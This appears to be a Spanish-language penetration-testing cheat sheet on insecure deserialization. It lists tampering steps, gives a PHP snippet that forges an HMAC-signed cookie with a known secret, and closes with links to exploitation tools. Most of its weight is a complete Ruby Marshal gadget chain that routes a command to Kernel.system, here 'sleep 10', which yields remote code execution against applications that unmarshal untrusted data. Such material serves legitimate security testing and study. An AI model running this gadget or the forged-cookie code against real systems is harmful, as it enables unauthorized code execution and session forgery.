-- -
###  **1. Probar modificando valores propios de la data serializada**

###  **2. Probar modificando los data types**
- b:1
- i:0
###  **3. Probar modificando ciertas rutas que aparezcan en la data serializada**

### **4. Codigo php para generar firma y serializar data**
```php
<?php
    $object = "object";

    $secretKey = "key";

    $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');

    echo $cookie;
?>
```

### **5. Gadget ruby generar cookie serializada**
- *Aclaracion:* Se necesita una version vieja para correr el script por lo que se tiene que montar un docker container
```ruby
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "sleep 10")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload
```


--- -
## Tools

https://github.com/frohoff/ysoserial
https://github.com/ambionics/phpggc
devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
https://github.com/PortSwigger/serialization-examples
https://github.com/kunte0/phar-jpg-polyglot